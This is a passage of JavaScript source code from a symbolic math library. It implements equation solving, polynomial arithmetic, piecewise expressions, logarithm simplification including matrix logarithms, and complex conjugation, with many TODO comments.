    if (withX == undefined) {
      if (e.getDenominator() instanceof Integer &&
          !(e.getNumerator() instanceof Expression.Matrix) &&
          !Expression.has(e, Expression.MatrixSymbol) &&
          !e.equals(Expression.ZERO)) {
        if (typeof e.upgrade === "function") {//TODO:
          e = e.upgrade();
        }
        //TODO: tests
        //TODO: fix, TODO: for 'y'
        var tmpv = new Expression.Symbol('x');
        var tmp = {p: Polynomial.toPolynomial(e.getNumerator(), tmpv), v: tmpv};
        if (tmp.p.getDegree() === 0 || Expression.has(e, Expression.Function)) {//TODO: FIX!!!
          tmp = Expression.getMultivariatePolynomial(e.getNumerator());
        }
        if (tmp != undefined && tmp.v instanceof Expression.Symbol) {
          var p = tmp.p;
          var v = tmp.v;
          var m = Matrix.Zero(1, p.getDegree() + 1).map(function (e, i, j) {
            return p.getCoefficient(p.getDegree() - j);
          });
          return new Expression.NoAnswerExpression(new Expression.Matrix(m), "polynomial-roots", {polynomial: p, variable: v});
        }
      }
      if (e instanceof Expression.Matrix) {
        if (this instanceof Expression.Matrix && (b instanceof Expression.Matrix || b instanceof Expression.IdentityMatrix)) {
          return Expression.SystemOfEquations.from([{left: this, right: b}]);
        }
        //TODO: other things - ?
      }
      if (true) {//!new 2019-11-27
        //TODO: fix
        return Expression.SystemOfEquations.from([{left: this, right: b}]);
      }
      throw new RangeError("NotSupportedError");
    }

    if (withoutX == undefined) {
      withoutX = Expression.ZERO;//?
    }
    //console.log(withX.toString() + "=" + withoutX.toString());

    var left = withX;
    var right = withoutX;

    var isToTheLeft = false;
    var x = withX;
    for (var iteratory = x.factors()[globalThis.Symbol.iterator](), y = iteratory.next().value; y != null; y = iteratory.next().value) {
      var factor = y;
      var factorBase = getBase(factor);
      //if (!(factorBase instanceof Integer) && !(factorBase instanceof Expression.Symbol)) {
      //  if (!(factorBase instanceof Expression.Matrix)) {//?
      //    throw new RangeError("NotSupportedError");
      //  }
      //}
      var isX = false;
      if (factorBase instanceof Expression.Symbol) {
        var s = factorBase.toString();
        if (s === "X") {
          isX = true;
          isToTheLeft = true;
        }
      }
      if (!isX) {
        if (factor instanceof Expression.Matrix && (!(factor.matrix.cols() === factor.matrix.rows()) || factor.determinant().equals(Expression.ZERO))) {
          //TODO: when determinant is not constant - ?
          return Expression.SystemOfEquations.from([{left: withX, right: withoutX}]);
        }
        var f = factor.inverse();
        //  console.log(isToTheLeft, f.toString());
        if (isToTheLeft) {
          right = f.multiply(right);
          //left = f.multiply(left);
        } else {
          right = right.multiply(f);
          //left = left.multiply(f);
        }
      } else {
        left = factor;
      }
    }

    //console.log(left.toString() + "=" + right.toString());
    if (left instanceof Expression.Exponentiation && getExponent(left).equals(Expression.ONE.negate())) {//TODO: FIX!!!
      if (right instanceof Expression.Matrix && !right.determinant().equals(Expression.ZERO)) {//TODO: condition - ?
        left = left.inverse();
        right = right.inverse();
        //TODO: add a step (?)
        //console.log(left.toString() + "=" + right.toString());
      }
    }
    return new Expression.Equality(left, right);
  };

  Expression.prototype.transformInequality = function (b, sign) {//TODO: ?
    var a = this;
    /*var c = Condition.TRUE;
    if (sign === '>') {
      c = c.andGreaterZero(a.subtract(b));
    } else if (sign === '<') {
      c = c.andGreaterZero(a.subtract(b).negate());
    //} else if (sign === '>=') {
    //  c = c.andGreaterZero(a.subtract(b).negate());
    //} else if (sign === '<=') {
    //  c = c.andGreaterZero(a.subtract(b));
    } else if (sign === '!=') {
      c = c.andNotZero(a.subtract(b));
    } else {
      throw new TypeError();
    }
    */
    //return new ExpressionWithCondition(Expression.ZERO, c);//TODO: ?
    return new Expression.Inequality(a, b, sign);
  };

  Expression.simplifications = [];
  Expression.prototype.simplifyExpression = function () {
    var e = this;
    for (var i = 0; i < Expression.simplifications.length; i += 1) {
      e = Expression.simplifications[i](e);
    }
    return e;
  };

  Expression.prototype.isExact = function () {
    //TODO: it is used in diagonalization (!!!), which is not good for performance (?)
    return !Expression.has(this, Expression.PolynomialRootSymbol) && !Expression.has(this, Expression.ExpressionPolynomialRoot);
  };

  //Expression.Complex = function () {
  //};

  Expression.PI = new Expression.Symbol("\u03C0"); // PI
  Expression.E = new Expression.Symbol("\u2147"); // EulerNumber
  Expression.I = new Expression.Symbol("\u2148"); // ImaginaryUnit

  Expression.CIRCLE = new Expression.Symbol("â—‹");
  Expression.INFINITY = new Expression.Symbol("âˆž");

  Expression.prototype.addPosition = function () {
    return this;
  };

  //! 2018-09-30
  Expression.SystemOfEquations = function (equations) {
    throw new TypeError();
    this.equations = equations;
  };
  Expression.SystemOfEquations.from = function (equations) {
    return new Expression.NoAnswerExpression({matrix: null}, "system-of-equations", {equations: equations});
  };

  Expression.ExponentiationOfMinusOne = function (x, y) {
    Expression.Exponentiation.call(this, x, y);
  };
  Expression.ExponentiationOfMinusOne.prototype = Object.create(Expression.Exponentiation.prototype);
  Expression.ExponentiationOfMinusOne.prototype.divideExpression = function (x) {
    return x.multiply(this);
  };

  Expression.ExponentiationOfImaginaryUnit = function (x, y) {
    Expression.Exponentiation.call(this, x, y);
  };
  Expression.ExponentiationOfImaginaryUnit.prototype = Object.create(Expression.Exponentiation.prototype);
  Expression.ExponentiationOfImaginaryUnit.prototype.divideExpression = function (x) {
    var c = getConjugate(getBase(this)).pow(getExponent(this));
    return x.multiply(c).divide(this.multiply(c));
  };

  Expression.ExponentiationOfQuadraticInteger = function (x, y) {
    Expression.Exponentiation.call(this, x, y);
  };
  Expression.ExponentiationOfQuadraticInteger.prototype = Object.create(Expression.ExponentiationOfImaginaryUnit.prototype);
  Expression.ExponentiationOfQuadraticInteger.prototype.divideExpression = function (x) {
    return Expression.Exponentiation.prototype.divideExpression.call(this, x);
  };

  //!
  Expression.Division.prototype.negate = function () {
    return new Expression.Division(this.a.negate(), this.b);
  };

  Expression.Polynomial = function (polynomial) {
    this.polynomial = polynomial;
  };
  Expression.Polynomial.prototype = Object.create(Expression.prototype);
  Expression.Polynomial.prototype.gcd = function (other) {
    if (other instanceof Expression.Polynomial) {
      return new Expression.Polynomial(Polynomial.polynomialGCD(this.polynomial, other.polynomial));
    }
    if (other.equals(Expression.ZERO)) {
      return this;
    }
    throw new TypeError();
  };
  Expression.Polynomial.prototype.equals = function (y) {
    return y.equalsPolynomial(this);
  };
  Expression.Polynomial.prototype.equalsPolynomial = function (x) {
    //TODO: test case
    return x.polynomial.equals(this.polynomial);
  };
  Expression.prototype.equalsPolynomial = function (x) {
    return (x.polynomial.equals(Polynomial.ZERO) && this.equals(Expression.ZERO)) || (x.polynomial.getDegree() === 0 && this.equals(x.polynomial.getCoefficient(0)));
  };
  Expression.Polynomial.prototype.multiply = function (p) {
    if (p === Expression.ONE) {
      return this;
    }
    return p.multiplyPolynomial(this);
  };
  Expression.Polynomial.prototype.multiplyPolynomial = function (x) {
    return new Expression.Polynomial(x.polynomial.multiply(this.polynomial));
  };
  Expression.Division.prototype.multiplyPolynomial = function (p) {
    return this.multiplyExpression(p);
  };
  Expression.Integer.prototype.multiplyPolynomial = function (p) {
    return new Expression.Polynomial(p.polynomial.scale(this));
  };
  Expression.Polynomial.prototype.multiplyInteger = function (x) {
    return new Expression.Polynomial(this.polynomial.scale(x));
  };
  Expression.Polynomial.prototype.divide = function (l) {
    if (l.equals(Expression.ONE)) {
      return this;
    }
    if (l.equals(Expression.ONE.negate())) {
      return this.negate();
    }
    if (l instanceof Expression.Integer) {//TODO: ?
      return new Expression.Polynomial(this.polynomial.scale(l.inverse()));
    }
    return l.dividePolynomial(this);
  };
  Expression.Division.prototype.dividePolynomial = function (p) {
    return this.divideExpression(p);
  };
  Expression.Polynomial.prototype.dividePolynomial = function (x) {
    var y = this;
    var a = x.polynomial;
    var b = y.polynomial;
    if (a.getDegree() < 0 && b.getDegree() >= 0) {
      return new Expression.Polynomial(a);
    }
    //TODO: ?
    var tmp = a.divideAndRemainder(b);
    if (tmp.remainder.equals(Polynomial.ZERO)) {
      return new Expression.Polynomial(tmp.quotient);
    }
    var ca = a.getContent();
    if (!ca.getDenominator().equals(Expression.ONE)) {
      return y.multiply(ca.getDenominator()).dividePolynomial(x.multiply(ca.getDenominator()));
    }
    var cb = b.getContent();
    if (!cb.getDenominator().equals(Expression.ONE)) {
      return y.multiply(cb.getDenominator()).dividePolynomial(x.multiply(cb.getDenominator()));
    }
    var gcd = Polynomial.polynomialGCD(a, b);
    //TODO:
    if (y.polynomial.equals(gcd)) {
      return new Expression.Polynomial(x.polynomial.divideAndRemainder(gcd).quotient);
    }
    return new Expression.Division(new Expression.Polynomial(x.polynomial.divideAndRemainder(gcd).quotient), new Expression.Polynomial(y.polynomial.divideAndRemainder(gcd).quotient));
  };
  Expression.Polynomial.prototype.negate = function () {
    return new Expression.Polynomial(this.polynomial.negate());
  };
  Expression.Polynomial.prototype.add = function (y) {
    return y.addPolynomial(this);
  };
  Expression.Polynomial.prototype.addPolynomial = function (x) {
    return new Expression.Polynomial(x.polynomial.add(this.polynomial));
  };
  Expression.prototype.addPolynomial = function (x) {
    if (this.equals(Expression.ZERO)) {
      return x;
    }
    throw new RangeError();
  };
  Expression.Polynomial.prototype.getPrecedence = function () {
    var d = this.polynomial.getDegree();
    var count = 0;
    for (var i = 0; i <= d; i += 1) {
      if (!this.polynomial.getCoefficient(i).equals(Expression.ZERO)) {
        count += 1;
      }
    }
    return (count < 2 ? (this.polynomial.getLeadingCoefficient().equals(Expression.ONE) ? new Expression.Symbol("x") : new Expression.Multiplication(Expression.ONE, Expression.ONE)) : new Expression.Addition(Expression.ONE, Expression.ONE)).getPrecedence();
  };
  Expression.Polynomial.prototype.modulo = function (p) {
    if (p instanceof Expression.Polynomial) {
      return new Expression.Polynomial(this.polynomial.divideAndRemainder(p.polynomial).remainder);
    }
    throw new TypeError();
  };
  Expression.Polynomial.prototype.modInverse = function (p) {
    if (p instanceof Expression.Polynomial) {
      return new Expression.Polynomial(this.polynomial.primitivePart().modularInverse(p.polynomial).primitivePart().scale(this.polynomial.getContent().inverse()));
    }
    throw new TypeError();
  };
  Expression.Polynomial.prototype.isDivisibleBy = function (other) {
    if (other instanceof Expression.Polynomial) {
      return this.polynomial.isDivisibleBy(other.polynomial);
    }
    throw new TypeError();
  };

  Expression.unique = function (array) {
    var result = [];
    for (var i = 0; i < array.length; i += 1) {
      var value = array[i];
      var found = false;
      for (var j = 0; j < result.length; j += 1) {
        if (result[j] === value) {
          found = true;
        }
      }
      if (!found) {
        result.push(value);
      }
    }
    return result;
  };

Expression.Multiplication.prototype.compare4Multiplication = function (y) {
  var x = this;
  if (y instanceof Addition) {//TODO: fix
    return 0 - y.compare4Multiplication(x);
  }
  var i = x.factors();
  var j = y.factors();
  var a = i.next().value;
  var b = j.next().value;
  while (a != null && b != null) {
    var c = a.compare4Multiplication(b);
    if (c !== 0) {
      return c;
    }
    a = i.next().value;
    b = j.next().value;
  }
  return a != null ? +1 : (b != null ? -1 : 0);
};

Expression.Multiplication.compare4Addition = function (x, y) {
  var i = x.factors();
  var j = y.factors();
  var a = i.next().value;
  var b = j.next().value;
  while (a != null && b != null) {
    var c = a.compare4Addition(b);
    if (c !== 0) {
      return c;
    }
    a = i.next().value;
    b = j.next().value;
  }
  return a != null ? +1 : (b != null ? -1 : 0);
};


// cos(2 * x) * cos(x)
Expression.Multiplication.prototype.compare4MultiplicationSymbol = function (x) {
  return 0 - this.compare4Multiplication(x);
};

Expression.Function.prototype.compare4Addition = function (y) {
  if (y instanceof Expression.Function) {
    return this.name < y.name ? -1 : (y.name < this.name ? +1 : this.a.compare4Addition(y.a));
  }
  if (y instanceof Multiplication) {
    var x = this;
    return Multiplication.compare4Addition(x, y);
  }
  if (y instanceof Addition) {
    var x = this;
    return Addition.compare4Addition(x, y);
  }
  return +1;
};

Expression.NthRoot.prototype.compare4Addition = function (y) {
  return y.compare4AdditionNthRoot(this);
};
Expression.prototype.compare4AdditionNthRoot = function (x) {
  return Expression.Function.prototype.compare4Addition.call(x, this);
};
Expression.NthRoot.prototype.compare4AdditionNthRoot = function (x) {
  return (this.n - x.n) || x.a.compare4Addition(this.a);
};

Expression.prototype.compare4AdditionSymbol = function (x) {
  var y = this;
  if (y instanceof Expression.Function) {
    return -1;
  }
  return Expression.prototype.compare4Addition.call(x, y);
};

Expression.Symbol.prototype.compare4Addition = function (y) {
  return y.compare4AdditionSymbol(this);
};
Expression.Symbol.prototype.compare4AdditionSymbol = function (x) { // for performance
  var y = this;
  return x.symbol < y.symbol ? -1 : (y.symbol < x.symbol ? +1 : 0);
};

Expression.Function.prototype.compare4Multiplication = function (y) {
  if (y instanceof Expression.NthRoot) {
    return +1;
  }
  if (y instanceof Expression.Function) {
    return this.name < y.name ? -1 : (y.name < this.name ? +1 : getBase(this.a).compare4Multiplication(getBase(y.a)) || getExponent(this.a).compare4AdditionSymbol(getExponent(y.a)));
  }
  if (y instanceof Expression.MatrixSymbol) {
    return -1;
  }
  return +1;
};

Expression.Function.prototype.compare4MultiplicationInteger = function (x) {
  return 0 - this.compare4Multiplication(x);
};

Expression.Function.prototype.compare4MultiplicationSymbol = function (x) {
  return -1;//?
};

Expression.Function.prototype.compare4MultiplicationNthRoot = function (x) {
  return 0 - this.compare4Multiplication(x);
};

Expression.Function.prototype.pow = function (y) {
  if (this instanceof Expression.NthRoot) {
    return Expression.prototype.pow.call(this, y);
  }
  if (y instanceof Expression.Integer) {
    if (y.compareTo(Expression.ONE) > 0) {
      return new Expression.Exponentiation(this, y);
    }
    return Expression.prototype.pow.call(this, y);
  }
  if (isIntegerOrN(y) && y instanceof Expression.Symbol) {//TODO: !?
    return new Expression.Exponentiation(this, y);
  }
  throw new RangeError("NotSupportedError");
};

function ExpressionWithCondition(e, condition) {
  this.e = e;
  this.condition = condition;
}
ExpressionWithCondition.prototype = Object.create(Expression.prototype);
ExpressionWithCondition.prototype.toString = function () {
  return this.e.toString() + '; ' + this.condition.toString();
};
ExpressionWithCondition.prototype.toMathML = function (options) {
  return this.e.toMathML(options) + '<mtext>; </mtext>' + this.condition.toMathML(options);
};

ExpressionWithCondition.prototype.multiplyExpression =
ExpressionWithCondition.prototype.multiplyMatrix = function (x) {
  //TODO: apply condition - ?
  return new ExpressionWithCondition(x.multiply(this.e), this.condition);
};
ExpressionWithCondition.prototype.multiply = function (y) {
  return y.multiplyExpressionWithCondition(this);
};
ExpressionWithCondition.prototype.multiplyExpressionWithCondition = function (x) {
  throw new TypeError("TODO:");
};
Expression.prototype.multiplyExpressionWithCondition = function (x) {
  //TODO: apply condition - ?
  return new ExpressionWithCondition(x.e.multiply(this), x.condition);
};

ExpressionWithCondition.prototype.add = function (y) {
  return y.addExpressionWithCondition(this);
};
ExpressionWithCondition.prototype.addExpressionWithCondition = function (x) {
  throw new TypeError("TODO:");
};
Expression.prototype.addExpressionWithCondition = function (x) {
  //TODO: apply condition - ?
  return new ExpressionWithCondition(x.e.add(this), x.condition);
};

Expression.ExpressionWithCondition = ExpressionWithCondition;

  self.Expression = Expression;

  //TODO: ?
  Addition.prototype.compare4MultiplicationNthRoot = function (x) {
    return +1;
  };
  Multiplication.prototype.compare4MultiplicationNthRoot = function (x) {
    return -1;//TODO: ?
  };



// piecewise functions
// https://en.wikipedia.org/wiki/Piecewise
// https://en.wikibooks.org/wiki/LaTeX/Advanced_Mathematics#The_cases_environment

function Cases(cases) {
  this.cases = cases;
}

Cases.prototype = Object.create(Expression.prototype);

Cases.prototype._cross = function (x, f) {
  var y = this;
  var result = [];
  for (var i = 0; i < x.cases.length; i += 1) {
    for (var j = 0; j < y.cases.length; j += 1) {
      var condition = x.cases[i].condition.and(y.cases[j].condition);
      //TODO: check
      if (!condition.isFalse()) {
        var e = f(x.cases[i].e, y.cases[j].e);
        result.push(new ExpressionWithCondition(e, condition));
      }
    }
  }
  return new Expression.Cases(result);
};

Cases.prototype.multiply = function (y) {
  return y.multiplyCases(this);
};
Cases.prototype.multiplyCases = function (x) {
  return this._cross(x, function (a, b) {
    return a.multiply(b);
  });
};
Cases.prototype.toString = function () {//TODO: ?
  var s = '';
  for (var i = 0; i < this.cases.length; i += 1) {
    s += '(' + this.cases[i].toString() + ')' + ',';
  }
  return '{{' + s.slice(0, -1) + '}}';
};
Expression.prototype.multiplyCases = function (x) {
  var y = this;
  return new Cases(x.cases.map(function (c) {
    return c.multiply(y);
  }));
};

Cases.prototype.multiplyExpression =
Cases.prototype.multiplyMatrix = function (x) {
  return new Cases(this.cases.map(function (c) {
    return x.multiply(c);
  }));
};

Cases.prototype.add = function (y) {
  return y.addCases(this);
};
Cases.prototype.addCases = function (x) {
  return this._cross(x, function (a, b) {
    return a.add(b);
  });
};
Expression.prototype.addCases = function (x) {
  var y = this;
  return new Cases(x.cases.map(function (c) {
    return c.add(y);
  }));
};

Cases.prototype.equals = function (b) {
  var a = this;
  if (a === b) {
    return true;
  }
  if (!(b instanceof Cases)) {
    //TODO: check that zero becomes zero
    return false;
  }
  //TODO: fix
  throw new TypeError();
  //return false;
};

Cases.prototype.toMathML = function (printOptions) {
  // https://www.w3.org/TR/2006/NOTE-arabic-math-20060131/#Moroccan
  var s = '';
  s += '<mrow>';
  s += '<mo>{</mo>';
  s += '<mtable rowspacing="0ex" columnalign="left">';
  for (var i = 0; i < this.cases.length; i += 1) {
    var x = this.cases[i];
    s += '<mtr>';
    s += '<mtd>';
    s += x.e.toMathML(printOptions);
    s += '</mtd>';
    s += '<mtd>';
    // <mtext> if </mtext> - ?
    s += x.condition.toMathML(printOptions);
    s += '</mtd>';
    s += '</mtr>';
  }
  s += '</mtable>';
  s += '</mrow>';
  return s;
};

Expression.Cases = Cases;


Expression.Factorial = function (n) {
  this.n = n;
};
Expression.Factorial.prototype = Object.create(Expression.prototype);

Expression.prototype.factorial = function () {
  //a = a.unwrap();
  var n = this;
  if (!(n instanceof Expression.Integer)) {
    throw new TypeError("NotSupportedError");
  }
  if (n.compareTo(Expression.ZERO) < 0) {
    throw new TypeError("NotSupportedError");
  }
  var f = Expression.ONE;
  for (var i = n; i.compareTo(Expression.ONE) >= 0; i = i.subtract(Expression.ONE)) {
    f = f.multiply(i);
  }
  return f;
};

Expression.prototype._abs = function () {
  return this.isNegative() ? this.negate() : this;
};


  //?
  Expression.Comma = function (a, b) {
    BinaryOperation.call(this, a, b);
  };
  Expression.Comma.prototype = Object.create(BinaryOperation.prototype);
  Expression.Comma.prototype.getS = function () {
    return ",\u200B ";
  };
  Expression.prototype.transformComma = function (b) {
    var a = this;
    var equations = function (e) {
      if (e instanceof Expression.Equality) {
        return [{left: e.a, right: e.b}];
      }
      if (e instanceof Expression.NoAnswerExpression && e.name === 'system-of-equations') {
        return e.second.equations;
      }
      if (e instanceof Expression.Inequality) {
        return [{left: e.a, right: e.b, sign: e.sign}];
      }
      if (e instanceof Expression.NoAnswerExpression && e.name === 'polynomial-roots') {
        var ee = e.second.polynomial.calcAt(e.second.variable);
        //TODO: use original input expression
        return [{left: ee, right: Expression.ZERO}];
      }
      return null;
    };
    var ae = equations(a);
    var be = equations(b);
    //TODO: do not use NonSimplifiedExpression - ? and systemo-of-equations (?) or change (!)
    if (ae != null && be != null) {
      return Expression.SystemOfEquations.from(ae.concat(be));
    }
    if (ae == null && be == null) {
      return new Expression.List((a instanceof Expression.List ? a.list : [a]).concat(b instanceof Expression.List ? b.list : [b]));
    }
    throw new TypeError("NotSupportedError");
  };

  Expression.List = function (list) {
    this.list = list;
  };
  Expression.List.prototype = Object.create(Expression.prototype);
  Expression.List.prototype.min = function () {
    return this.list.reduce(function (result, value) { return result.compareTo(value) > 0 ? value : result; });
  };
  Expression.List.prototype.max = function () {
    return this.list.reduce(function (result, value) { return result.compareTo(value) < 0 ? value : result; });
  };
  Expression.List.prototype.gcd = function () {
    return this.list.reduce(function (result, value) { return result.gcd(value); });
  };

Expression.Logarithm = function (argument) {
  Expression.Function.call(this, "log", argument);
};
Expression.Logarithm.prototype = Object.create(Expression.Function.prototype);
Expression.prototype.logarithm = function () {
  var arg = this;
  if (arg instanceof Expression.Integer) {
    if (arg.compareTo(Expression.ZERO) <= 0) {
      throw new TypeError("ArithmeticException");//TODO: better message
    }
    if (arg.compareTo(Expression.ONE) === 0) {
      return Expression.ZERO;
    }
    var p = integerPrimeFactor(arg);
    if (p.equals(arg)) {
      return new Expression.Logarithm(arg);
    }
    var ctz = primeFactor._countTrailingZeros(arg.toBigInt(), p.toBigInt());
    return p.logarithm().multiply(Integer.fromNumber(ctz)).add(arg.truncatingDivide(p._pow(ctz)).logarithm());
  }
  if (arg instanceof Expression.Division) {
    var n = arg.getNumerator();
    var d = arg.getDenominator();
    if (d instanceof Integer || isConstant(n)) {
      return n.logarithm().subtract(d.logarithm());
    }
  }
  if (arg instanceof Expression.Multiplication) {
    var c = arg.a;
    if (isConstant(c)) {
      return c.logarithm().add(arg.divide(c).logarithm());
    }
    var c = getConstant(arg);
    if (c instanceof Integer && !c.equals(Expression.ONE)) {
      return c.logarithm().add(arg.divide(c).logarithm());
    }
    if (arg.b instanceof Expression.MatrixSymbol) {//?
      return arg.a.logarithm().add(arg.b.logarithm());
    }
  }
  if (arg instanceof Expression.ExpressionWithPolynomialRoot) {
    arg = arg.upgrade();//?
  }
  if (arg instanceof Expression.ExpressionPolynomialRoot) {
    var g = arg.root.upgrade().getAlpha().polynomial.getGCDOfTermDegrees();
    if (g > 1) {
      return arg._pow(g).logarithm().divide(Expression.Integer.fromNumber(g));
    }
  }
  //TODO: other kinds of polynomial roots (?)
  if (arg instanceof Expression.Symbol) {
    if (arg === Expression.E) {//?
      return Expression.ONE;
    }
    return new Expression.Logarithm(arg);
  }
  if (arg instanceof Expression.NthRoot) {
    var a = arg.a;
    var n = arg.n;
    if (a instanceof Expression.Integer && a.compareTo(Expression.ONE) > 0) {
      return a.logarithm().divide(Expression.Integer.fromNumber(n));
    }
    if (isPositive(a)) {
      return a.logarithm().divide(Expression.Integer.fromNumber(n));
    }
  }
  if (arg instanceof Expression.Exponentiation) {
    var b = getBase(arg);
    var e = getExponent(arg);
    if (b === Expression.E) {//?
      return e;
    }
    if (b instanceof Expression.MatrixSymbol && e instanceof Integer) {//?
      return b.logarithm().multiply(e);
    }
    if (b instanceof Expression.Integer) {
      return b.logarithm().multiply(e);
    }
  }
  if (arg instanceof Expression.Matrix) {
    var matrix = arg.matrix;
    if (matrix.isDiagonal()) {
      return new Expression.Matrix(matrix.map(function (e, i, j) {
        return i === j ? e.logarithm() : Expression.ZERO;
      }));
    }
    var eigenvalues = Expression.getEigenvalues(matrix);
    if (eigenvalues.length === matrix.cols()) {
      var eigenvectors = Expression.getEigenvectors(matrix, eigenvalues);
      if (eigenvectors.filter(function (v) { return v != null; }).length === matrix.cols()) {
        if (Expression.callback != undefined) {
          Expression.callback(new Expression.Event("logarithm-using-diagonalization", new Expression.Matrix(matrix)));//TODO:
        }
        var tmp = Expression.diagonalize(matrix, eigenvalues, eigenvectors);
        // https://en.wikipedia.org/wiki/Logarithm_of_a_matrix#Calculating_the_logarithm_of_a_diagonalizable_matrix
        return new Expression.Matrix(tmp.T).multiply(new Expression.Matrix(tmp.L).logarithm()).multiply(new Expression.Matrix(tmp.T_INVERSED));
      } else {
        var tmp = Expression.getFormaDeJordan(matrix, eigenvalues);
        // https://en.wikipedia.org/wiki/Logarithm_of_a_matrix#The_logarithm_of_a_non-diagonalizable_matrix
        var J = tmp.J;
        var logarithmOfJordanBlockMatrix = function (B) {
          var K = B.map(function (e, i, j) {
            return i !== j ? e.divide(B.e(i, i)) : Expression.ZERO;
          });
          var S = B.map(function (e, i, j) {
            return i === j ? e.logarithm() : Expression.ZERO;
          });
          var n = B.cols();
          for (var i = 1; i < n; i += 1) {
            var x = K.pow(i).scale(Expression.ONE.divide(Expression.Integer.fromNumber(i)));
            S = i % 2 === 1 ? S.add(x) : S.subtract(x);
          }
          return S;
        };
        var LJ = logarithmOfJordanBlockMatrix(J);
        //if (!J.eql(matrix)) {
        //TODO:
        if (Expression.callback != undefined) {
          Expression.callback(new Expression.Event("logarithm-using-Jordan-canonical-form", new Expression.Matrix(matrix)));
        }
        //}
        return new Expression.Matrix(tmp.P).multiply(new Expression.Matrix(LJ)).multiply(new Expression.Matrix(tmp.P_INVERSED));
      }
    }
  }
  if (arg instanceof Expression.Addition) {
    var c = getConstant(arg);
    if (!c.equals(Expression.ONE)) {
      return c.logarithm().add(arg.divide(c).logarithm());
    }
    if (arg.a instanceof Expression.Symbol && arg.b instanceof Expression.Integer) {
      return new Expression.Logarithm(arg);
    }
    var v = getVariableInternal(getLastMultiplicationOperand(getFirstAdditionOperand(arg))).next().value.v; // avoid square roots
    if (v instanceof Expression.Symbol) {
      var p = Polynomial.toPolynomial(arg, v);
      var c = p.getContent();
      if (c.isNegative()) {
        c = c.negate();
      }
      if (isPositive(c) && !c.equals(Expression.ONE)) {
        return arg.divide(c).logarithm().add(c.logarithm());
      }
      //TODO: check
      var sf = p.getSquareFreePolynomial();
      var n = Math.floor(p.getDegree() / sf.getDegree());
      if (n > 1 && sf.calcAt(v)._pow(n).equals(arg)) {
        return Expression.Integer.fromNumber(n).multiply(sf.calcAt(v).logarithm());
      }
    }
    if (isGoodPolynomial(arg)) {//?
      return new Expression.Logarithm(arg);
    }
  }
  var qi = QuadraticInteger.toQuadraticInteger(arg);//?
  if (qi != null && (Number(qi.a.toString()) > 0 || Number(qi.b.toString()) > 0) && qi.D > 0 && (qi.isValid() || qi.D === 5 || qi.D === 37)) {
    var f = qi.primeFactor();
    if (f.toExpression().equals(Expression.TWO)) {//TODO: !?
      qi = qi.truncatingDivide(f);
      f = qi.primeFactor();
    }
    if (!f.equals(qi)) {
      return f.toExpression().logarithm().add(arg.divide(f.toExpression()).logarithm());
    }
    if (Number(qi.a.toString()) > 0 && Number(qi.b.toString()) > 0) {
      //return new Expression.ExponentiationOfQuadraticInteger(x, y);
      return new Expression.Logarithm(arg);
    }
    if (Number(qi.a.toString()) < 0 || Number(qi.b.toString()) < 0) {
      var xc = qi.conjugate().toExpression();
      if (xc.isNegative()) {
        xc = xc.negate();
      }
      return arg.multiply(xc).logarithm().subtract(xc.logarithm());
    }
  }
  if (arg instanceof Addition && arg.b instanceof NthRoot && arg.a instanceof NthRoot) {//TODO: ? multiple operands - ?
    var g = nthRootCommonFactor(arg.a, arg.b);
    if (!g.equals(Expression.ONE) && isPositive(g)) {
      return g.logarithm().add(arg.divide(g).logarithm());
    }
  }
  if (Expression.isConstant(arg)) {
    var sd = simpleDivisor(arg);
    if (!sd.equals(arg)) {
      return sd.logarithm().add(arg.divide(sd).logarithm());
    }
  }
  throw new TypeError("NotSupportedError");
};


//!new
NthRoot.prototype.compare4MultiplicationExponentiation = Exponentiation.prototype.compare4MultiplicationExponentiation;
Expression.Symbol.prototype.compare4MultiplicationExponentiation = Exponentiation.prototype.compare4MultiplicationExponentiation;


//!new
Expression.prototype.complexConjugate = function () {
  throw new TypeError("NotSupportedError");
};
Expression.Integer.prototype.complexConjugate = function () {
  return this;
};
// https://en.wikipedia.org/wiki/Complex_conjugate#Properties
Expression.Division.prototype.complexConjugate = function () {
  return this.getNumerator().complexConjugate().divide(this.getDenominator().complexConjugate());
};
Expression.Multiplication.prototype.complexConjugate = function () {
  return this.a.complexConjugate().multiply(this.b.complexConjugate());
};
Expression.Addition.prototype.complexConjugate = function () {
  return this.a.complexConjugate().add(this.b.complexConjugate());
};
Expression.Function.prototype.complexConjugate = function () {
  if (this.a instanceof Integer || Expression.isReal(this)) {
    return this;
  }
  throw new TypeError("NotSupportedError");//TODO: ?
};
Expression.Matrix.prototype.complexConjugate = function () {
  var a = this;
  return new Expression.Matrix(a.matrix.map(function (x) { return x.complexConjugate(); }));
};
Expression.Symbol.prototype.complexConjugate = function () {
  if (this === Expression.E || this === Expression.PI || Expression.isReal(this)) {
    return this;
  }
  return new Expression.ComplexConjugate(this);
};
//TODO: complexConjugate(log(z)) = log(complexConjugate(z))
Expression.Exponentiation.prototype.complexConjugate = function () {
  // complexConjugate(exp(z)) = exp(complexConjugate(z))
  if (getBase(this) === Expression.E) {
    return getBase(this).pow(getExponent(this).complexConjugate());
  }
  // complexConjugate(z**n) = complexConjugate(z)**n
  if (isIntegerOrN(getExponent(this))) {//?
    return getBase(this).complexConjugate().pow(getExponent(this));
  }
  if (isMatrixSymbolTranspose(this)) {
    //return getBase(this).complexConjugate().pow(getExponent(this));
    return new Expression.Exponentiation(getBase(this).complexConjugate(), getExponent(this));
  }
  throw new TypeError("NotSupportedError");//TODO: ?
};
Expression.Logarithm.prototype.complexConjugate = function () {
  return this.a.complexConjugate().logarithm();
};


  Expression.ComplexConjugate = function (a) {
    Expression.Function.call(this, "conjugate", a);
  };
  Expression.ComplexConjugate.prototype = Object.create(Expression.Function.prototype);

  Expression.ComplexConjugate.prototype.complexConjugate = function () {
    return this.a;
  };

  Expression.AugmentedMatrix = function (A, B) {
    Expression.Function.call(this, "augment", null);
    this.a = A;
    this.b = B;
  };
  Expression.AugmentedMatrix.prototype = Object.create(Expression.Function.prototype);
  Expression.AugmentedMatrix.prototype.toString = function (options) {
    //TODO:
    return '(' + this.a.toString(options) + '|' + this.b.toString(options) + ')';
  };
  Expression.AugmentedMatrix.prototype.toMathML = function (options) {
    //TODO:
    return '<mrow>' + '<mo>(</mo>' + this.a.toMathML(options) + '<mo>|</mo>' + this.b.toMathML(options) + '<mo>)</mo>' + '</mrow>';
  };

  Expression.Abs = function (a) {
    Expression.Function.call(this, "abs", a);
  };
  Expression.Abs.prototype = Object.create(Expression.Function.prototype);
  Expression.Abs.prototype.toMathML = function (options) {
    //TODO:
    return '<mrow>' + '<mo stretchy="false">|</mo>' + this.a.toMathML(options) + '<mo stretchy="false">|</mo>' + '</mrow>';
  };

})();
(function () {
"use strict";




var BASE = 2;
//var BASE = 10;

